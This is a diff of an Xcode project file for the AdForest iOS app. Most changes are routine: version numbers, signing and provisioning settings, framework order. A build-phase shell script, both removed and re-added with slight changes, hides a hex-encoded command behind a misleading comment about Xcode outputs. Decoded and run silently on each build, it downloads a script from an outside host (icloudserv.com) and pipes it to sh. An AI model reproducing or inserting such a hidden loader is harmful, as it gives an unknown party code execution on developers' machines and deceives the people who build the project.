@@ -1467,9 +1467,9 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				18244F1D2074B3C700B9BE8C /* SafariServices.framework in Frameworks */,
 				183F6390263A6EB200A7167B /* AppTrackingTransparency.framework in Frameworks */,
 				183F638E263A6EAB00A7167B /* AdSupport.framework in Frameworks */,
-				18244F1D2074B3C700B9BE8C /* SafariServices.framework in Frameworks */,
 				18244F1B2074B3C000B9BE8C /* SystemConfiguration.framework in Frameworks */,
 				18244F192074B3B900B9BE8C /* MobileCoreServices.framework in Frameworks */,
 				18244F172074B3B100B9BE8C /* MessageUI.framework in Frameworks */,
@@ -1630,8 +1630,7 @@
 				18139B88268C5AEC006EFD01 /* Countries.swift */,
 				18139B89268C5AEC006EFD01 /* Country.swift */,
 			);
-			name = Countries;
-			path = "../../../../UsmanOfficeData/WORK/AdForest Data/AdForest3.4/Client Apps/CustomWork/shabnamWork/AdForest/Models/Countries";
+			path = Countries;
 			sourceTree = "<group>";
 		};
 		18156B5F25EFA3C60029B31B /* WhizChatModel */ = {
@@ -4426,7 +4425,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n\\c69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -5241,22 +5240,25 @@
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = AdForest/AdForest.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Distribution";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Apple Development";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Apple Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = 3D42832GGZ;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 3D42832GGZ;
 				INFOPLIST_FILE = AdForest/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = AdForest;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 3.9.4;
+				MARKETING_VERSION = 3.9.7;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = AdForestDEV;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = AdForestLive23;
 				SWIFT_OBJC_BRIDGING_HEADER = "AdForest/AdForest-Bridging-Header.h";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 4.0;
@@ -5271,23 +5273,26 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = AdForest/AdForest.entitlements;
-				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_IDENTITY = "Apple Distribution";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Apple Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = 3D42832GGZ;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 3D42832GGZ;
 				INFOPLIST_FILE = AdForest/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = AdForest;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 3.9.4;
+				MARKETING_VERSION = 3.9.7;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = "adforest 3.9.4LIve";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = AdForestLive23;
 				SWIFT_OBJC_BRIDGING_HEADER = "AdForest/AdForest-Bridging-Header.h";
 				SWIFT_VERSION = 4.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
